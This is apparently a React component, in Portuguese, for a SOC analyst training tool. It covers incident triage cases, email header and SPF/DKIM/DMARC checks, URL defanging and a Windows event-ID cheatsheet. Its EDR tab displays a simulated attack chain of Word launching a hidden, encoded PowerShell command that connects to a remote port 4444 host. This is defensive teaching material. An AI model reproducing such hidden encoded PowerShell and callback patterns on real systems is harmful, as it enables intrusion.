            <h1 className="text-xl md:text-2xl font-black text-white mt-1">SOC Triage & Incident Response</h1>
            <p className="text-xs md:text-sm text-slate-400">
              Fluxo prático em 7 etapas, análise de cabeçalhos de phishing, investigação EDR e resolução de casos reais.
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2 self-start md:self-auto">
          <button
            onClick={() => setActiveTab('war-room')}
            className={`px-3 py-2 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition-all ${
              activeTab === 'war-room'
                ? 'bg-rose-500 text-white shadow-lg shadow-rose-500/25'
                : 'bg-slate-900 text-slate-400 border border-slate-800 hover:border-slate-700'
            }`}
          >
            <ShieldAlert size={14} />
            <span>War Room (Casos)</span>
          </button>
          <button
            onClick={() => setActiveTab('phishing-lab')}
            className={`px-3 py-2 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition-all ${
              activeTab === 'phishing-lab'
                ? 'bg-rose-500 text-white shadow-lg shadow-rose-500/25'
                : 'bg-slate-900 text-slate-400 border border-slate-800 hover:border-slate-700'
            }`}
          >
            <Mail size={14} />
            <span>Phishing Lab</span>
          </button>
          <button
            onClick={() => setActiveTab('edr-inspector')}
            className={`px-3 py-2 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition-all ${
              activeTab === 'edr-inspector'
                ? 'bg-rose-500 text-white shadow-lg shadow-rose-500/25'
                : 'bg-slate-900 text-slate-400 border border-slate-800 hover:border-slate-700'
            }`}
          >
            <Cpu size={14} />
            <span>EDR Process Tree</span>
          </button>
          <button
            onClick={() => setActiveTab('cheatsheet')}
            className={`px-3 py-2 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition-all ${
              activeTab === 'cheatsheet'
                ? 'bg-rose-500 text-white shadow-lg shadow-rose-500/25'
                : 'bg-slate-900 text-slate-400 border border-slate-800 hover:border-slate-700'
            }`}
          >
            <FileText size={14} />
            <span>Guia Rápido SOC</span>
          </button>
        </div>
      </div>

      {/* ── TAB 1: WAR ROOM DE INCIDENTES REAIS ────────────────────────────────── */}
      {activeTab === 'war-room' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Left: Case Selector */}
          <div className="lg:col-span-4 space-y-3">
            <h2 className="text-xs font-bold uppercase tracking-wider text-slate-400 px-1 flex items-center justify-between">
              <span>Incidentes para Triagem ({INCIDENT_CASES.length})</span>
              <span className="text-[10px] text-rose-400 font-mono">Live SIEM Queue</span>
            </h2>

            <div className="space-y-2">
              {INCIDENT_CASES.map(c => {
                const isSelected = c.id === selectedCaseId;
                const isCompleted = caseProgress[c.id]?.completed;
                return (
                  <button
                    key={c.id}
                    onClick={() => {
                      setSelectedCaseId(c.id);
                      setCurrentStepIndex(0);
                      setSelectedOptionId(null);
                    }}
                    className={`w-full text-left p-3.5 rounded-xl border transition-all ${
                      isSelected
                        ? 'bg-rose-500/10 border-rose-500/40 text-white shadow-md'
                        : 'bg-slate-900/60 border-slate-800/80 text-slate-300 hover:border-slate-700 hover:bg-slate-900'
                    }`}
                  >
                    <div className="flex items-center justify-between gap-2 mb-1.5">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                        c.severity === 'CRITICAL'
                          ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                          : 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                      }`}>
                        {c.severity}
                      </span>
                      {isCompleted ? (
                        <span className="flex items-center gap-1 text-[11px] font-semibold text-emerald-400">
                          <CheckCircle2 size={12} /> Concluído
                        </span>
                      ) : (
                        <span className="text-[10px] text-slate-500 font-mono">
                          {c.steps.length} etapas
                        </span>
                      )}
                    </div>
                    <h3 className="text-xs font-bold text-slate-100 line-clamp-1">{c.title}</h3>
                    <p className="text-[11px] text-slate-400 line-clamp-1 mt-0.5">{c.alertName}</p>
                    <div className="flex items-center gap-2 mt-2 text-[10px] text-slate-500">
                      <span className="truncate">👤 {c.user.split('@')[0]}</span>
                      <span>•</span>
                      <span className="truncate">💻 {c.affectedAsset.split(' ')[0]}</span>
                    </div>
                  </button>
                );
              })}
            </div>

            {/* 7-Step Reference Box */}
            <div className="p-4 rounded-xl bg-slate-950 border border-slate-800/80 space-y-2.5 text-xs">
              <div className="font-bold text-slate-200 flex items-center gap-1.5 text-xs">
                <Layers size={14} className="text-rose-400" />
                <span>Ciclo em 7 Passos do Analista SOC</span>
              </div>
              <ol className="space-y-1 text-[11px] text-slate-400 list-decimal list-inside leading-relaxed">
                <li><strong className="text-slate-300">Observe:</strong> Ingestão e leitura do alerta</li>
                <li><strong className="text-slate-300">Validate:</strong> Descartar Falsos Positivos</li>
                <li><strong className="text-slate-300">Investigate:</strong> Enriquecer com logs e contexto</li>
                <li><strong className="text-slate-300">Correlate:</strong> Cruzar SIEM, EDR e Rede</li>
                <li><strong className="text-slate-300">Decide:</strong> Declarar True Positive e Impacto</li>
                <li><strong className="text-slate-300">Contain:</strong> Isolar máquina, revogar tokens</li>
                <li><strong className="text-slate-300">Document:</strong> Post-mortem e lições</li>
              </ol>
            </div>
          </div>

          {/* Right: Active Incident Step Runner */}
          <div className="lg:col-span-8 space-y-4">
            <div className="p-5 rounded-2xl bg-slate-900/80 border border-slate-800 space-y-5">
              {/* Header of Active Case */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-slate-800">
                <div>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-[11px] font-mono text-rose-400 font-semibold">{activeCase.alertName}</span>
                    <span className="text-slate-600">•</span>
                    <span className="text-[10px] text-slate-400 font-mono">{activeCase.mitreTactic}</span>
                  </div>
                  <h2 className="text-lg font-bold text-white">{activeCase.title}</h2>
                </div>
                <div className="flex items-center gap-2">
                  <button
                    onClick={handleResetCase}
                    className="p-2 rounded-lg bg-slate-800 text-slate-400 hover:text-slate-200 hover:bg-slate-700 transition-colors"
                    title="Reiniciar Caso"
                  >
                    <RotateCcw size={14} />
                  </button>
                </div>
              </div>

              {/* Progress Steps Indicators */}
              <div className="flex items-center justify-between gap-1 overflow-x-auto pb-1">
                {activeCase.steps.map((s, idx) => {
                  const isCurrent = idx === currentStepIndex;
                  const isDone = idx < currentStepIndex || caseProgress[activeCase.id]?.completed;
                  return (
                    <button
                      key={s.stepNumber}
                      onClick={() => {
                        setCurrentStepIndex(idx);
                        setSelectedOptionId(null);
                      }}
                      className={`flex-1 min-w-[120px] p-2 rounded-lg text-left border transition-all ${
                        isCurrent
                          ? 'bg-rose-500/20 border-rose-500 text-white'
                          : isDone
                          ? 'bg-slate-800/60 border-slate-700/80 text-emerald-400'
                          : 'bg-slate-950 border-slate-800 text-slate-500'
                      }`}
                    >
                      <div className="flex items-center justify-between text-[10px] font-bold">
                        <span>Etapa {s.stepNumber}</span>
                        {isDone && <CheckCircle2 size={12} className="text-emerald-400" />}
                      </div>
                      <div className="text-[11px] truncate font-medium mt-0.5 text-slate-300">{s.phase.split('. ')[1] || s.phase}</div>
                    </button>
                  );
                })}
              </div>

              {/* Step Content */}
              <div className="space-y-4">
                <div>
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <span className="w-6 h-6 rounded-full bg-rose-500/20 text-rose-400 text-xs flex items-center justify-center font-bold">
                      {currentStep.stepNumber}
                    </span>
                    {currentStep.title}
                  </h3>
                  <p className="text-xs text-slate-300 mt-1">{currentStep.actionRequired}</p>
                </div>

                {/* Query / Command Box */}
                {currentStep.commandOrQuery && (
                  <div className="rounded-xl border border-slate-800 overflow-hidden text-xs bg-slate-950">
                    <div className="flex items-center justify-between px-3 py-1.5 bg-slate-900 border-b border-slate-800 text-[10px] text-slate-400 font-mono">
                      <span>Consulta KQL / SIEM / PowerShell</span>
                    </div>
                    <pre className="p-3 text-[11px] font-mono text-sky-300 overflow-x-auto leading-relaxed">
                      {currentStep.commandOrQuery}
                    </pre>
                  </div>
                )}

                {/* Evidence Terminal Box */}
                <div className="rounded-xl border border-rose-950/80 overflow-hidden text-xs bg-[#0f111a]">
                  <div className="flex items-center justify-between px-3 py-1.5 bg-slate-900/90 border-b border-slate-800 text-[10px] text-rose-400 font-mono font-bold flex gap-2">
                    <div className="flex gap-1.5">
                      <span className="w-2.5 h-2.5 rounded-full bg-red-500/70 inline-block"></span>
                      <span className="w-2.5 h-2.5 rounded-full bg-amber-500/70 inline-block"></span>
                      <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/70 inline-block"></span>
                    </div>
                    <span>Evidência Forense / Raw Output</span>
                  </div>
                  <pre className="p-3.5 text-[11px] font-mono text-emerald-300/90 whitespace-pre-wrap leading-relaxed overflow-x-auto">
                    {currentStep.evidence}
                  </pre>
                </div>

                {/* Decision Options */}
                <div className="space-y-2 pt-2">
                  <h4 className="text-xs font-bold text-slate-200">Decisão do Analista SOC:</h4>
                  <div className="space-y-2">
                    {currentStep.options.map(opt => {
                      const isChosen = selectedOptionId === opt.id;
                      return (
                        <button
                          key={opt.id}
                          onClick={() => handleOptionSelect(opt.id)}
                          className={`w-full text-left p-3 rounded-xl border text-xs transition-all ${
                            isChosen
                              ? opt.isCorrect
                                ? 'bg-emerald-950/40 border-emerald-500 text-emerald-200'
                                : 'bg-red-950/40 border-red-500 text-red-200'
                              : 'bg-slate-950 border-slate-800 text-slate-300 hover:border-slate-700'
                          }`}
                        >
                          <div className="flex items-start gap-2.5">
                            <span className={`w-4 h-4 rounded-full flex items-center justify-center text-[10px] shrink-0 mt-0.5 ${
                              isChosen
                                ? opt.isCorrect ? 'bg-emerald-500 text-black font-bold' : 'bg-red-500 text-white font-bold'
                                : 'border border-slate-700 text-slate-500'
                            }`}>
                              {isChosen ? (opt.isCorrect ? '✓' : '✗') : ''}
                            </span>
                            <div className="space-y-1">
                              <p className="font-medium leading-relaxed">{opt.label}</p>
                              {isChosen && (
                                <p className={`text-[11px] mt-1 pt-1 border-t border-slate-800/60 ${
                                  opt.isCorrect ? 'text-emerald-400' : 'text-red-400'
                                }`}>
                                  💡 {opt.feedback}
                                </p>
                              )}
                            </div>
                          </div>
                        </button>
                      );
                    })}
                  </div>
                </div>

                {/* Footer Controls */}
                <div className="flex items-center justify-between pt-3 border-t border-slate-800">
                  <span className="text-[11px] text-slate-500">
                    Etapa {currentStepIndex + 1} de {activeCase.steps.length}
                  </span>

                  {selectedOptionId && (
                    <button
                      onClick={handleNextStep}
                      className="px-4 py-2 rounded-xl bg-rose-500 hover:bg-rose-600 text-white font-bold text-xs flex items-center gap-1.5 transition-all shadow-lg shadow-rose-500/25"
                    >
                      <span>
                        {currentStepIndex < activeCase.steps.length - 1 ? 'Próxima Etapa' : 'Finalizar Caso & Gerar Relatório'}
                      </span>
                      <ArrowRight size={14} />
                    </button>
                  )}
                </div>
              </div>
            </div>

            {/* Final Case Report Generator */}
            {caseProgress[activeCase.id]?.completed && (
              <div className="p-5 rounded-2xl bg-emerald-950/20 border border-emerald-500/30 space-y-4 animate-fadeIn">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2 text-emerald-400 font-bold text-sm">
                    <CheckCircle2 size={18} />
                    <span>Incidente Triado e Contido com Sucesso!</span>
                  </div>
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(generatedReport);
                      setCopiedReport(true);
                      setTimeout(() => setCopiedReport(false), 2000);
                    }}
                    className="px-3 py-1.5 rounded-lg bg-emerald-500/20 hover:bg-emerald-500/30 border border-emerald-500/40 text-emerald-300 text-xs font-semibold flex items-center gap-1.5 transition-all"
                  >
                    {copiedReport ? <Check size={14} /> : <Copy size={14} />}
                    <span>{copiedReport ? 'Copiado!' : 'Copiar Relatório Jira'}</span>
                  </button>
                </div>

                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 font-mono text-[11px] text-slate-300 leading-relaxed overflow-x-auto">
                  <pre className="whitespace-pre-wrap">{generatedReport}</pre>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── TAB 2: PHISHING EMAIL HEADER LAB & URL DEFANGER ────────────────────── */}
      {activeTab === 'phishing-lab' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-7 space-y-4">
            <div className="p-5 rounded-2xl bg-slate-900 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Mail className="text-rose-400" size={18} />
                  <h2 className="text-sm font-bold text-white">Analisador de Cabeçalho Bruto (Raw Email Header)</h2>
                </div>
                <span className="text-[10px] font-mono text-slate-400 bg-slate-800 px-2 py-0.5 rounded">
                  RFC 5322 & SPF/DKIM/DMARC
                </span>
              </div>

              <p className="text-xs text-slate-400">
                Cole abaixo o cabeçalho completo de um e-mail suspeito para validar se o remetente é forjado (spoofing) e extrair o primeiro IP de entrega.
              </p>

              <textarea
                value={phishingRawHeader}
                onChange={e => setPhishingRawHeader(e.target.value)}
                rows={10}
                className="w-full p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-[11px] text-slate-200 focus:border-rose-500 focus:outline-none leading-relaxed"
                placeholder="Paste Raw Email Headers here..."
              />

              {/* Automatic Header Parser Badges */}
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800/80 space-y-3">
                <h3 className="text-xs font-bold text-slate-200 flex items-center gap-1.5">
                  <Search size={14} className="text-rose-400" />
                  <span>Diagnóstico Automático de Autenticação</span>
                </h3>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                  <div className={`p-2.5 rounded-lg border text-xs ${
                    phishingRawHeader.toLowerCase().includes('spf=fail')
                      ? 'bg-red-950/30 border-red-500/40 text-red-300'
                      : 'bg-emerald-950/30 border-emerald-500/40 text-emerald-300'
                  }`}>
                    <div className="font-bold">SPF (Sender Policy)</div>
                    <div className="text-[11px] font-mono mt-0.5">
                      {phishingRawHeader.toLowerCase().includes('spf=fail') ? '❌ FAIL (IP não autorizado)' : '✓ PASS'}
                    </div>
                  </div>

                  <div className={`p-2.5 rounded-lg border text-xs ${
                    phishingRawHeader.toLowerCase().includes('dkim=fail')
                      ? 'bg-red-950/30 border-red-500/40 text-red-300'
                      : 'bg-emerald-950/30 border-emerald-500/40 text-emerald-300'
                  }`}>
                    <div className="font-bold">DKIM (Criptografia)</div>
                    <div className="text-[11px] font-mono mt-0.5">
                      {phishingRawHeader.toLowerCase().includes('dkim=fail') ? '❌ FAIL (Hash inválido)' : '✓ PASS'}
                    </div>
                  </div>

                  <div className={`p-2.5 rounded-lg border text-xs ${
                    phishingRawHeader.toLowerCase().includes('dmarc=fail')
                      ? 'bg-red-950/30 border-red-500/40 text-red-300'
                      : 'bg-emerald-950/30 border-emerald-500/40 text-emerald-300'
                  }`}>
                    <div className="font-bold">DMARC Alignment</div>
                    <div className="text-[11px] font-mono mt-0.5">
                      {phishingRawHeader.toLowerCase().includes('dmarc=fail') ? '❌ REJECT / QUARANTINE' : '✓ PASS'}
                    </div>
                  </div>
                </div>

                <div className="p-3 rounded-lg bg-rose-500/10 border border-rose-500/20 text-xs text-rose-200">
                  <strong>Veredito SOC:</strong> E-mail com cabeçalho spoofado. O IP remetente real <code>185.220.101.89</code> não pertence ao ASN da Microsoft. Deve ser bloqueado no gateway de e-mail e as URLs devem ser colocadas em quarentena.
                </div>
              </div>
            </div>
          </div>

          {/* Right: URL Defanger & IoC Extractor */}
          <div className="lg:col-span-5 space-y-4">
            <div className="p-5 rounded-2xl bg-slate-900 border border-slate-800 space-y-4">
              <div className="flex items-center gap-2">
                <Lock className="text-rose-400" size={18} />
                <h2 className="text-sm font-bold text-white">Ferramenta de Defang de URLs & IoCs</h2>
              </div>
              <p className="text-xs text-slate-400">
                Transforme links e IPs maliciosos em formatos não clicáveis antes de anexar aos relatórios de incidente.
              </p>

              <div className="space-y-2">
                <label className="text-[11px] font-bold text-slate-300">URL / IP Original:</label>
                <input
                  type="text"
                  value={inputUrlToDefang}
                  onChange={e => setInputUrlToDefang(e.target.value)}
                  className="w-full p-2.5 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-slate-200 focus:border-rose-500 focus:outline-none"
                />
              </div>

              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <label className="text-[11px] font-bold text-emerald-400">Formato Defang Seguro (Pronto para Relatório):</label>
                  <button
                    onClick={() => navigator.clipboard.writeText(defangString(inputUrlToDefang))}
                    className="text-[10px] text-slate-400 hover:text-white flex items-center gap-1 font-mono"
                  >
                    <Copy size={11} /> Copiar
                  </button>
                </div>
                <div className="p-3 rounded-xl bg-slate-950 border border-emerald-500/30 font-mono text-xs text-emerald-300 break-all">
                  {defangString(inputUrlToDefang)}
                </div>
              </div>

              {/* Quick Knowledge Pills */}
              <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2 text-xs">
                <div className="font-bold text-slate-200">🔍 Como Ler o "Received: from" de Baixo para Cima:</div>
                <p className="text-[11px] text-slate-400 leading-relaxed">
                  Os cabeçalhos <code>Received: from</code> são inseridos a cada salto de servidor SMTP. A linha mais <strong>abaixo</strong> (bottom) indica o servidor atacante de origem. As linhas superiores foram geradas pelos seus servidores de e-mail confiáveis internos.
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── TAB 3: EDR PROCESS TREE INSPECTOR ──────────────────────────────────── */}
      {activeTab === 'edr-inspector' && (
        <div className="p-5 rounded-2xl bg-slate-900 border border-slate-800 space-y-5">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div>
              <h2 className="text-base font-bold text-white flex items-center gap-2">
                <Cpu size={20} className="text-rose-400" />
                <span>Inspetor de Árvore de Processos EDR & Windows Event ID 4688</span>
              </h2>
              <p className="text-xs text-slate-400 mt-0.5">
                Identificação de anomalias Parent-Child e técnicas de Living off the Land (LOLBAS).
              </p>
            </div>
          </div>

          {/* Interactive Process Tree Visualizer */}
          <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs space-y-3">
            <div className="text-[11px] text-slate-500 border-b border-slate-800 pb-2 flex items-center justify-between">
              <span>HOST: WS-FINANCE-04 · PID Tree Navigation</span>
              <span className="text-rose-400 font-bold">🔴 1 Alerta Crítico Detectado</span>
            </div>

            {/* Tree Node 1 */}
            <div className="p-2.5 rounded-lg bg-slate-900/60 border border-slate-800 text-slate-300">
              <div className="flex items-center gap-2 font-bold text-slate-200">
                <span>📁 explorer.exe (PID: 2890)</span>
                <span className="text-[10px] px-1.5 py-0.5 bg-slate-800 text-slate-400 rounded">Parent Root</span>
              </div>
              <div className="text-[11px] text-slate-500 mt-1">
                User: CONTOSO\mariana.silva · Path: C:\Windows\explorer.exe
              </div>

              {/* Child Node 2 */}
              <div className="ml-6 mt-2.5 pl-3 border-l-2 border-slate-700 space-y-2.5">
                <div className="p-2.5 rounded-lg bg-amber-950/20 border border-amber-500/30 text-slate-200">
                  <div className="flex items-center gap-2 font-bold text-amber-300">
                    <span>📄 WINWORD.EXE (PID: 4012)</span>
                    <span className="text-[10px] px-1.5 py-0.5 bg-amber-500/20 text-amber-300 rounded">Processo de Usuário</span>
                  </div>
                  <div className="text-[11px] text-slate-400 mt-1">
                    CommandLine: "C:\Program Files\Microsoft Office\WINWORD.EXE" "C:\Users\mariana\Downloads\Fatura_Setembro.docm"
                  </div>

                  {/* Child Node 3 (Anomalous LOLBAS) */}
                  <div className="ml-6 mt-2.5 pl-3 border-l-2 border-red-500 space-y-2.5">
                    <div className="p-3 rounded-lg bg-red-950/40 border border-red-500/50 text-red-200 animate-pulse">
                      <div className="flex items-center gap-2 font-bold text-red-400">
                        <span>⚠️ cmd.exe (PID: 5120)</span>
                        <span className="text-[10px] px-1.5 py-0.5 bg-red-500 text-white font-black rounded">ANOMALIA LOLBAS</span>
                      </div>
                      <div className="text-[11px] text-slate-300 mt-1">
                        CommandLine: cmd.exe /c powershell.exe -w hidden -enc JABzACAAPQAgAE4AZQB3...
                      </div>
                      <div className="text-[10px] text-red-300 mt-1.5 bg-red-950/80 p-2 rounded border border-red-500/30">
                        🚨 <strong>Alerta EDR:</strong> O Microsoft Word NUNCA deve gerar interpretadores de comando (cmd/powershell). Isso confirma execução de macro maliciosa com bypass de AMSI e execução em memória.
                      </div>

                      {/* Child Node 4 (PowerShell C2 Connection) */}
                      <div className="ml-6 mt-2.5 pl-3 border-l-2 border-red-500">
                        <div className="p-2.5 rounded-lg bg-red-950/60 border border-red-500 text-red-200">
                          <div className="flex items-center gap-2 font-bold text-red-300">
                            <span>🌐 powershell.exe (PID: 6204) → Conexão TCP Ativa</span>
                          </div>
                          <div className="text-[11px] text-slate-300 mt-1 font-mono">
                            Remote IP: 185.220.101.5:4444 (ESTABLISHED) · Protocol: Raw TCP Socket
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── TAB 4: CHEATSHEET & SOC N1 INTERVIEW GUIDE ─────────────────────────── */}
      {activeTab === 'cheatsheet' && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {/* Windows Event IDs */}
          <div className="p-5 rounded-2xl bg-slate-900 border border-slate-800 space-y-3">
            <h2 className="text-sm font-bold text-white flex items-center gap-2">
              <FileText size={18} className="text-rose-400" />
              <span>Windows Event IDs Mandatórios para o SOC</span>
            </h2>
            <div className="space-y-2 text-xs">
              {[
                { id: '4624', title: 'Successful Logon', desc: 'Login efetuado com sucesso. Verificar LogonType (3=Rede, 10=RDP).' },
                { id: '4625', title: 'Failed Logon', desc: 'Tentativa falhada de login. Múltiplos eventos = Brute Force / Password Spray.' },
                { id: '4688', title: 'A new process has been created', desc: 'Criação de processo. Registra linha de comando e PID pai.' },
                { id: '4672', title: 'Special privileges assigned', desc: 'Atribuição de privilégios de administrador/sistema.' },
                { id: '7045', title: 'A service was installed (System log)', desc: 'Instalação de novo serviço Windows (Persistência / Privilege Escalation).' },
                { id: '4720', title: 'A user account was created', desc: 'Criação de nova conta de usuário no Windows ou AD.' },
                { id: '1102', title: 'The audit log was cleared', desc: 'Log de auditoria foi apagado (Tentativa de Anti-Forensics).' }
              ].map(ev => (
                <div key={ev.id} className="p-2.5 rounded-xl bg-slate-950 border border-slate-800 flex items-start gap-2.5">
                  <span className="px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 font-mono font-bold text-[11px] shrink-0">
                    {ev.id}
                  </span>
                  <div>
                    <div className="font-bold text-slate-200">{ev.title}</div>
                    <div className="text-[11px] text-slate-400">{ev.desc}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Windows Logon Types & Pyramid of Pain */}
          <div className="space-y-6">
            <div className="p-5 rounded-2xl bg-slate-900 border border-slate-800 space-y-3">
              <h2 className="text-sm font-bold text-white flex items-center gap-2">
                <KeyRound size={18} className="text-rose-400" />
                <span>Tipos de Logon do Windows (LogonType)</span>
              </h2>
              <div className="space-y-1.5 text-xs">
                {[
                  { type: 'Type 2', name: 'Interactive', desc: 'Login local no teclado físico da máquina.' },
                  { type: 'Type 3', name: 'Network', desc: 'Conexão via rede (compartilhamento SMB, IPC$, Pass-the-Hash).' },
                  { type: 'Type 4', name: 'Batch', desc: 'Execução de tarefa agendada (Scheduled Task).' },
                  { type: 'Type 5', name: 'Service', desc: 'Inicialização de serviço do Windows.' },
                  { type: 'Type 10', name: 'RemoteInteractive', desc: 'Conexão de Área de Trabalho Remota (RDP / Terminal Services).' }
                ].map(lt => (
                  <div key={lt.type} className="p-2 rounded-lg bg-slate-950 border border-slate-800 flex items-center justify-between">
                    <span className="font-mono font-bold text-sky-400 text-[11px]">{lt.type} ({lt.name})</span>
                    <span className="text-[11px] text-slate-400 text-right">{lt.desc}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Pyramid of Pain */}
            <div className="p-5 rounded-2xl bg-slate-900 border border-slate-800 space-y-3">
              <h2 className="text-sm font-bold text-white flex items-center gap-2">
                <Layers size={18} className="text-rose-400" />
                <span>Pirâmide da Dor (David Bianco)</span>
              </h2>
              <div className="space-y-1.5 text-xs">
                {[
                  { level: 'TTPs', pain: 'Tough! (Doloroso)', color: 'bg-red-500/20 text-red-300 border-red-500/40', desc: 'Táticas, Técnicas e Procedimentos do invasor.' },
                  { level: 'Tools', pain: 'Challenging', color: 'bg-amber-500/20 text-amber-300 border-amber-500/40', desc: 'Softwares de ataque (Mimikatz, Cobalt Strike).' },
                  { level: 'Host/Net Artifacts', pain: 'Annoying', color: 'bg-yellow-500/20 text-yellow-300 border-yellow-500/40', desc: 'Padrões de User-Agent, chaves de registro.' },
                  { level: 'Domain Names', pain: 'Simple', color: 'bg-sky-500/20 text-sky-300 border-sky-500/40', desc: 'Domínios C2 (mudam rapidamente via DGA).' },
                  { level: 'IP Addresses', pain: 'Easy', color: 'bg-blue-500/20 text-blue-300 border-blue-500/40', desc: 'IPs atacantes (trocados facilmente via proxies/VPN).' },
                  { level: 'Hash Values', pain: 'Trivial', color: 'bg-slate-800 text-slate-300 border-slate-700', desc: 'MD5/SHA256 (alterados com 1 byte diferente).' }
                ].map(pop => (
                  <div key={pop.level} className={`p-2 rounded-lg border flex items-center justify-between ${pop.color}`}>
                    <span className="font-bold">{pop.level}</span>
                    <span className="text-[10px] font-mono">{pop.pain} · {pop.desc}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
